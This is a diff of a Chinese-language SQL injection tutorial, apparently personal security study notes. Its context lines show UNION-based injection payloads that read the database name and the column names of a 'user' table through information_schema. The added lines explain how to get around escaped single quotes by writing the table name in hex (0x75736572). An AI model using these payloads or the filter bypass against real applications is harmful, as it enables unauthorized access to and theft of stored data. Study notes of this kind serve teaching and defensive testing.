@@ -99,6 +99,10 @@ select * from user where username='1' union all select 1,database(),3,4,5,6,7,8,
 select * from user where username='1' union all select 1,database(),3,4,5,6,7,8,9,10,column_name,12 from information_schema.columns where table_schema = 'test_fastapi' and table_name = 'user' #'
 ```
 ![image](https://github.com/498946975/Security/blob/master/images/sql_24.png)
+##### 如果单引号被转译了，可以用16进制来替代单引号
+```yaml
+user的16进制：0x75736572
+```
 
 ### 9、联合注入的过程7:
 ### 查询user表的用户名和密码
